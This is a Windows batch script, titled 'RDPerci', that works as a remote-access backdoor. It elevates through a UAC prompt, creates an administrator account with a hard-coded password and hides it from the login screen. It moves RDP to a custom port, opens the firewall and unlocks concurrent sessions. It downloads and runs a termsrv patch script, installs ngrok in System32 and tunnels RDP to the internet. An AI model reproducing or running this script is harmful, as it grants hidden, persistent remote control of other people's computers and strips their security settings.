@echo on

title RDPerci :)

set new_user="Percin0"
set new_password="Password123!"
set new_port="8888"
set ngrok_token=""

net session >nul 2>&1
if %errorLevel% == 0 (
     echo Success! The installation is started, waiting....
     goto gotAdmin
) else (
 echo Failure! You need to be admin to install this program.
 goto UACPrompt
)

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin

net user %new_user% /add
net user %new_user% %new_password%

net localgroup Administrators /add %new_user% 

net localgroup Administradores /add %new_user% 

net localgroup Amministratori /add %new_user% 

net localgroup Administratoren /add %new_user% 

net localgroup Administrateurs /add %new_user% 

net localgroup "Remote Desktop Users" /add %new_user% 

net user %new_user% /expires:never

reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d %new_port% -f   
netsh advfirewall firewall add rule name="RDPPORTLatest-TCP-In" dir=in action=allow protocol=TCP localport=%new_port% 

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v %new_user% /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AllowMultipleTSSessions /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v MaxInstanceCount /t REG_DWORD /d 100 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Licensing Core" /v EnableConcurrentSessions /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v EnableConcurrentSessions /t REG_DWORD /d 1 /f

cd  %temp%
powershell -command "Set-ExecutionPolicy Unrestricted"

powershell -command  "Invoke-WebRequest -Uri https://raw.githubusercontent.com/maxbakhub/winposh/main/termsrv_rdp_patch.ps1 -OutFile termsrv_rdp_patch.ps1"

powershell -command  "./termsrv_rdp_patch.ps1"

cd C:\Windows\System32
powershell -command  "Invoke-WebRequest -Uri https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip"
powershell -command "Expand-Archive -Force 'C:\Windows\System32\ngrok.zip' 'C:\Windows\System32\ngrok'"

cd C:\Windows\System32\ngrok
ngrok.exe authtoken %ngrok_token% 

ngrok.exe tcp %new_port% --log=stdout > ngrok.log &

exit
